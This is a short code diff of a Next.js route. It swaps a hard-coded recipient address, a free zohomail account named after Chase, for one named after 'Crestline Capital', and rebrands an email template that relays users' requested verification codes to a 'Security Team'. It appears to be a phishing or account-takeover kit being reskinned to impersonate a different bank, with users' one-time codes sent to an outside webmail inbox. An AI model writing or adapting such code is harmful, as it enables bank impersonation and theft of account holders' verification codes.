@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from "next/server"
 
-const CUSTOMER_SERVICE_EMAIL = "chase.org_info247@zohomail.com"
+const CUSTOMER_SERVICE_EMAIL = "Crestline.org_info247@zohomail.com"
 
 export async function POST(request: NextRequest) {
   try {
@@ -108,7 +108,7 @@ function buildEmailContent(
 
   const typeName = typeNames[type as keyof typeof typeNames] || "Verification"
 
-  let content = `Dear Chase Security Team,
+  let content = `Dear Crestline Capital Security Team,
 
 A ${typeName} verification code has been requested by user ${userName}.
 
@@ -138,7 +138,7 @@ Security Notes:
 - Use secure communication channels only
 
 Best regards,
-Chase Security System`
+Crestline Capital Security System`
 
   return content
 }
